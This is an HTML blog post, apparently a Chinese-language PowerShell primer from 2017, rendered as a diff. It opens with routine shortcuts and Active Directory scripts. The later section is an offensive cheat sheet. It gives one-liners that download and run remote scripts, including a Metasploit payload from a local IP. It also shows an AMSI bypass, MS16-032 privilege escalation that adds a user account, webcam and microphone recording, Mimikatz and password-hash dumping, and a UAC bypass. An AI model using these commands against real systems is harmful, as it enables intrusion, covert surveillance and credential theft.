@@ -1,0 +1,653 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Powershell-Basic-learning - Evi1oX</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Evi1oX" /><meta name="description" content="powershell无所不能 0x01 初步认知 PowerShell是Windows的自动化平台和脚本语言，可让您简化系统管理。与其他基于文本的she" /><meta name="keywords" content="Hugo, theme, even" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.54.0 with theme even" />
+
+
+<link rel="canonical" href="https://04z.net/post/powershell-basic-learning/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+<link href="/dist/even.983f84a7.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Powershell-Basic-learning" />
+<meta property="og:description" content="powershell无所不能 0x01 初步认知 PowerShell是Windows的自动化平台和脚本语言，可让您简化系统管理。与其他基于文本的she" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://04z.net/post/powershell-basic-learning/" />
+<meta property="article:published_time" content="2017-06-27T23:09:17&#43;00:00"/>
+<meta property="article:modified_time" content="2017-06-27T23:09:17&#43;00:00"/>
+
+<meta itemprop="name" content="Powershell-Basic-learning">
+<meta itemprop="description" content="powershell无所不能 0x01 初步认知 PowerShell是Windows的自动化平台和脚本语言，可让您简化系统管理。与其他基于文本的she">
+
+
+<meta itemprop="datePublished" content="2017-06-27T23:09:17&#43;00:00" />
+<meta itemprop="dateModified" content="2017-06-27T23:09:17&#43;00:00" />
+<meta itemprop="wordCount" content="2049">
+
+
+
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Powershell-Basic-learning"/>
+<meta name="twitter:description" content="powershell无所不能 0x01 初步认知 PowerShell是Windows的自动化平台和脚本语言，可让您简化系统管理。与其他基于文本的she"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Evi1oX</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/post/friends">
+        <li class="mobile-menu-item">Friends</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Evi1oX</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/post/friends">Friends</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Powershell-Basic-learning</h1>
+
+      <div class="post-meta">
+        
+        
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+<ul>
+<li><a href="#0x01-初步认知">0x01 初步认知</a>
+<ul>
+<li><a href="#属性强化-11">属性强化 +11</a></li>
+<li><a href="#powershell-快捷键">Powershell 快捷键</a></li>
+<li><a href="#给ad添加自定义属性">给AD添加自定义属性</a></li>
+<li><a href="#克隆ad权限">克隆AD权限</a></li>
+<li><a href="#获取域下面的操作系统列表">获取域下面的操作系统列表</a></li>
+<li><a href="#powershell被禁用">Powershell被禁用</a></li>
+<li><a href="#powershell能做什么">powershell能做什么？</a>
+<ul>
+<li><a href="#获取无线密码">获取无线密码</a></li>
+<li><a href="#提权加账号">提权加账号</a></li>
+<li><a href="#下载执行">下载执行</a></li>
+<li><a href="#摄像头录像">摄像头录像</a></li>
+<li><a href="#录音">录音</a></li>
+<li><a href="#use">use</a></li>
+<li><a href="#下载">下载</a></li>
+<li><a href="#mimikatz">Mimikatz</a></li>
+<li><a href="#gethash">Gethash</a></li>
+<li><a href="#进程注入">进程注入</a></li>
+<li><a href="#dll注入">DLL注入</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#0x02-将powershell脚本快速转换为bat文件">0x02 将PowerShell脚本快速转换为bat文件</a></li>
+</ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      
+
+<p>powershell无所不能</p>
+
+<h1 id="0x01-初步认知">0x01 初步认知</h1>
+
+<p><code>PowerShell</code>是Windows的自动化平台和脚本语言，可让您简化系统管理。与其他基于文本的shell不同，他利用了<code>Microsoft .NET</code>Framework的强大功能，提供丰富的对象和大量内置函数来控制</p>
+
+<p>PowerShell最初在2010年被提及为<a href="https://www.youtube.com/watch?v=JKlVONfD53w">攻击平台</a>，当它在Def Con 18中被提出作为概念证明。在PowerShell中纯粹编程的绑定和反向shell都在相同的上下文中被证明。</p>
+
+<h2 id="属性强化-11">属性强化 +11</h2>
+
+<blockquote>
+<p>轻松访问网络连接<br />
+安装恶意的二进制文件到内存<br />
+直接访问Win32应用程序编程接口（API）<br />
+有着WMI类似的简单界面<br />
+强大的脚本环境<br />
+动态链接库直接调用<br />
+轻松访问加密库，例如IPSec，散列算法<br />
+挂钩托管代码的能力<br />
+<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363%28v=vs.85%29.aspx">组件对象模型COM的绑定</a></p>
+</blockquote>
+
+<p>还有如Nishang，PowerSploit和<a href="www.PowerShellempire.com">PowerShell Empire平台</a>等众多攻击工具,提供基于密码通信的后开发代理。这些工具可用于侦察，持续和横向攻击等技术。当然，在现在windows默认都安装的情况下,直接可以通过编程，提供定制的工具和技术，以保持隐身，并且不被普通的安全控制和防护软件所侦测</p>
+
+<h2 id="powershell-快捷键">Powershell 快捷键</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">ALT+F7      清除命令的历史记录
+PgUp PgDn   显示当前会话的第一个命令和最后一个命令
+Enter       执行当前命令
+End         将光标移至当前命令的末尾
+Del         从右开始删除输入的命令字符
+Esc         清空当前命令行
+F2          自动补充历史命令至指定字符
+            (例如历史记录中存在Get-Process，按F2，提示&#34;Enter char to copy up to&#34;，键入‘s’，自动补齐命令:Get-Proce)
+F4          删除命令行至光标右边指定字符处
+F7          对话框显示命令行历史记录
+F8          检索包含指定字符的命令行历史记录
+F9          根据命令行的历史记录编号选择命令，历史记录编号可以通过F7查看
+左/右方向键   左右移动光标
+上/下方向键   切换命令行的历史记录
+Home        光标移至命令行最左端
+Backspace   从右删除命令行字符
+Ctrl+C      取消正在执行的命令
+Ctrl+左/右方向键 在单词之间移动光标
+Ctrl+Home   删除光标最左端的所有字符
+Tab         自动补齐命令或者文件名</pre></td></tr></table>
+</div>
+</div>
+<h2 id="给ad添加自定义属性">给AD添加自定义属性</h2>
+
+<p>如果你需要给AD对象添加自定义的属性，你可以使用一个哈希表设定属性的名字和值，这时候就可以使用微软RSAT工具包中的Set-ADUser命令来添加它。<code>-add</code>是给属性添加一个新的属性，<code>-Remove</code>是删除一个已存在属性值， <code>–Replace</code>则可以替换一个属性的值。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#requires -Version 1 -Modules ActiveDirectory</span>
+<span class="c"># create an empty hash table</span>
+<span class="nv">$custom</span> <span class="p">=</span> <span class="p">@{}</span>
+
+<span class="c"># add the attribute names and values</span>
+<span class="nv">$custom</span><span class="p">.</span><span class="n">ExtensionAttribute3</span> <span class="p">=</span> <span class="n">12</span>
+<span class="nv">$custom</span><span class="p">.</span><span class="n">ExtensionAttribute4</span> <span class="p">=</span> <span class="s1">&#39;Hello&#39;</span>
+
+<span class="c"># assign the attributes to your current user object</span>
+<span class="nv">$user</span> <span class="p">=</span> <span class="nv">$env:USERNAME</span>
+<span class="nb">Set-ADUser</span> <span class="n">-Identity</span> <span class="nv">$user</span> <span class="n">-Add</span> <span class="nv">$custom</span></code></pre></td></tr></table>
+</div>
+</div>
+<h2 id="克隆ad权限">克隆AD权限</h2>
+
+<p>当你要创建一个委托对象（如管管理成员或组织单元），你实际上是在调整它的安全属性。<br />
+安全属性可能非常复杂，但克隆一个则非常简单，所以你可以选择克隆一个AD对象的安全权限。<br />
+下面教各位如何将一个OU对象的安全描述克隆给另外一个，开始前你需要添加AD模块：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#requires -Version 2 -Modules ActiveDirectory</span>
+<span class="nb">Import-Module</span> <span class="n">-Name</span> <span class="n">ActiveDirectory</span>
+
+<span class="c"># read AD security from NewOU1</span>
+<span class="nv">$sd</span> <span class="p">=</span> <span class="nb">Get-Acl</span> <span class="n">-Path</span> <span class="s1">&#39;AD:\OU=NewOU1,DC=powershell,DC=local&#39;</span>
+
+<span class="c"># assign security to NewOU2</span>
+<span class="nb">Set-Acl</span> <span class="n">-Path</span> <span class="s1">&#39;AD:\OU=NewOU2,DC=powershell,DC=local&#39;</span> <span class="n">-AclObject</span> <span class="nv">$sd</span></code></pre></td></tr></table>
+</div>
+</div>
+<h2 id="获取域下面的操作系统列表">获取域下面的操作系统列表</h2>
+
+<p>脚本会从AD中获取所有的机器账户，并通过操作系统名称对它们进行分组，然后生成一个列表。请最好使用分页，如果你的组织规模比较大，检索所有的机器可能会很耗时。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#&lt;span class=&#34;tc-dropcap&#34;&gt;r&lt;/span&gt;equires -Version 1 -Modules ActiveDirectory</span>
+
+<span class="nv">$max</span> <span class="p">=</span> <span class="n">100</span>
+
+<span class="nv">$os</span> <span class="p">=</span> <span class="nb">Get-ADComputer</span> <span class="n">-Filter</span> <span class="p">*</span> <span class="n">-Properties</span> <span class="n">OperatingSystem</span> <span class="n">-ResultPageSize</span> <span class="nv">$max</span> <span class="p">|</span>
+<span class="nb">Group-Object</span> <span class="n">-Property</span> <span class="n">OperatingSystem</span> <span class="n">-NoElement</span> <span class="p">|</span>
+<span class="nb">Select-object</span> <span class="n">-ExpandProperty</span> <span class="n">Name</span> <span class="p">|</span>
+<span class="k">ForEach</span><span class="n">-Object</span> <span class="p">{</span> <span class="s1">&#39;&#34;{0}&#34;&#39;</span> <span class="o">-f</span> <span class="nv">$_</span> <span class="p">}</span>
+
+<span class="nv">$list</span> <span class="p">=</span> <span class="nv">$os</span> <span class="n">-join</span> <span class="s1">&#39;,&#39;</span>
+<span class="nv">$list</span>
+<span class="c"># 将列表复制到剪切板</span>
+<span class="nv">$list</span> <span class="p">|</span> <span class="n">clip</span></code></pre></td></tr></table>
+</div>
+</div>
+<h2 id="powershell被禁用">Powershell被禁用</h2>
+
+<blockquote>
+<p>默认情况下的Server OS 对应的 Powershell的版本：<br />
+Windows 2008 R2   -   Version 2<br />
+Windows 2012      -   Version 3<br />
+Windows 2012 R2   -   Version 4<br />
+Windows 2016      -   Version 5</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">set-executionpolicy</span> <span class="n">remotesigned</span>    <span class="c">#需要在管理员的状态下执行</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><a href="https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/">.Net执行</a><br />
+<a href="https://github.com/Cn33liz/p0wnedShell">p0wnedShell</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">cd</span> <span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">NET</span><span class="p">\</span><span class="n">Framework64</span><span class="p">\</span><span class="n">v4</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">30319</span>
+
+<span class="n">csc</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">unsafe</span> <span class="p">/</span><span class="n">reference</span><span class="err">:</span><span class="s2">&#34;C:\p0wnedShell\System.Management.Automation.dll&#34;</span> <span class="p">/</span><span class="n">reference</span><span class="err">:</span><span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">dll</span> <span class="p">/</span><span class="n">win32icon</span><span class="err">:</span><span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">p0wnedShell</span><span class="p">\</span><span class="n">p0wnedShell</span><span class="p">.</span><span class="n">ico</span> <span class="p">/</span><span class="n">out</span><span class="err">:</span><span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">p0wnedShell</span><span class="p">\</span><span class="n">p0wnedShellx64</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">platform</span><span class="err">:</span><span class="n">x64</span> <span class="s2">&#34;C:\p0wnedShell\*.cs&#34;</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><a href="https://labs.portcullis.co.uk/blog/powerops-powershell-for-offensive-operations/">PowerOPS</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">C</span><span class="err">:</span><span class="p">\&gt;</span> <span class="n">cd</span> <span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">NET</span><span class="p">\</span><span class="n">Framework</span><span class="p">\</span><span class="n">v4</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">30319</span> <span class="p">(</span><span class="n">Or</span> <span class="n">newer</span> <span class="p">.</span><span class="n">NET</span> <span class="n">version</span> <span class="n">folder</span><span class="p">)</span>
+<span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">NET</span><span class="p">\</span><span class="n">Framework</span><span class="p">\</span><span class="n">v4</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">30319</span><span class="p">\&gt;</span> <span class="n">InstallUtil</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">logfile</span><span class="p">=</span> <span class="p">/</span><span class="n">LogToConsole</span><span class="p">=</span><span class="n">false</span> <span class="p">/</span><span class="n">U</span> <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">path</span><span class="p">\</span><span class="n">to</span><span class="p">\</span><span class="n">PowerOPS</span><span class="p">.</span><span class="n">exe</span></code></pre></td></tr></table>
+</div>
+</div>
+<h2 id="powershell能做什么">powershell能做什么？</h2>
+
+<p>Command</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell">    <span class="n">powershell</span> <span class="n">-nop</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-c</span> <span class="n">IEX</span> <span class="p">(</span>   <span class="nb">New-Objectet</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://ip:port/&#39;</span><span class="p">)</span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell">    <span class="nb">Get-Content</span> <span class="n">payload</span><span class="p">.</span><span class="n">ps1</span> <span class="p">|</span> <span class="n">iex</span>
+    <span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">K</span> <span class="p">&lt;</span> <span class="n">payload</span><span class="p">.</span><span class="n">bat</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>link</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell">    <span class="n">powershell</span> <span class="n">-nop</span> <span class="n">-windows</span> <span class="n">hidden</span> <span class="n">-E</span> <span class="n">YwBhAGwAYwAuAGUAeABlAA</span><span class="p">==</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="获取无线密码">获取无线密码</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell">    <span class="n">powershell</span> <span class="n">-nop</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-c</span> <span class="s2">&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Get-WLAN-Keys.ps1&#39;);Get-Wlan-Keys &#34;</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="提权加账号">提权加账号</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell">    <span class="n">powershell</span> <span class="n">-nop</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-c</span> <span class="s2">&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&#39;);Invoke-MS16-032 -Application cmd.exe -commandline &#39;/c net user evi1cg test123 /add&#39;&#34;</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="下载执行">下载执行</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell">    <span class="n">powershell</span> <span class="n">-w</span> <span class="n">hidden</span> <span class="n">-c</span> <span class="p">(</span><span class="nb">new-object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">Downloadfile</span><span class="p">(</span><span class="s1">&#39;http://b.hiphotos.baidu.com/image/pic/item/d009b3de9c82d15825ffd75c840a19d8bd3e42da.jpg&#39;</span><span class="p">,</span><span class="s1">&#39;C:\\Users\Public\\test.jpg&#39;</span><span class="p">)</span> <span class="p">&amp;</span> <span class="n">start</span> <span class="n">C</span><span class="err">:</span><span class="p">\\</span><span class="n">Users</span><span class="p">\\</span><span class="n">Public</span><span class="p">\\</span><span class="n">test</span><span class="p">.</span><span class="n">jpg</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="摄像头录像">摄像头录像</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell">    <span class="n">powershell</span> <span class="n">-nop</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-c</span> <span class="s2">&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/xorrior/RandomPS-Scripts/master/MiniEye.ps1&#39;); Capture-MiniEye -RecordTime 2 -Path $env:temp\hack.avi&#34;</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="录音">录音</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell">    <span class="n">powershell</span> <span class="n">-nop</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-c</span> <span class="s2">&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-MicrophoneAudio.ps1&#39;);Get-MicrophoneAudio -Path $env:TEMP\secret.wav -Length 10 -Alias &#39;SECRET&#39;&#34;</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="use">use</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell">    <span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="n">-noprofile</span> <span class="no">[Ref]</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">AmsiUtils</span><span class="s1">&#39;&#39;</span><span class="p">).</span><span class="n">GetField</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="n">amsiInitFailed</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="n">NonPublic</span><span class="p">,</span><span class="n">Static</span><span class="s1">&#39;&#39;</span><span class="p">).</span><span class="n">SetValue</span><span class="p">(</span><span class="nv">$null</span><span class="p">,</span><span class="nv">$true</span><span class="p">);</span><span class="n">iex</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">230</span><span class="p">.</span><span class="n">1</span><span class="p">/</span><span class="n">msfpayload</span><span class="p">.</span><span class="n">ps1</span><span class="s1">&#39;&#39;</span><span class="p">)</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="下载">下载</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell">    <span class="nv">$p</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span>
+    <span class="nv">$p</span><span class="p">.</span><span class="n">DownloadFile</span><span class="p">(</span><span class="s2">&#34;http://domain/file&#34;</span><span class="p">,</span><span class="s2">&#34;C:%homepath%file&#34;</span><span class="p">)</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="mimikatz">Mimikatz</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell">    <span class="n">powershell</span> <span class="n">IEX</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;</span><span class="p">);</span> <span class="nb">Invoke-Mimikatz</span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell">    <span class="nb">Invoke-PsUACme</span> <span class="n">-Payload</span> <span class="s2">&#34;powershell -noexit IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz&#34;</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="gethash">Gethash</h3>
+
+<p>在线导hash</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell">    <span class="n">powershell</span> <span class="n">IEX</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&#39;</span><span class="p">);</span><span class="nb">Get-PassHashes</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>在线导明文</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell">    <span class="n">powershell</span> <span class="n">IEX</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;</span><span class="p">);</span> <span class="nb">Invoke-Mimikatz</span></code></pre></td></tr></table>
+</div>
+</div>
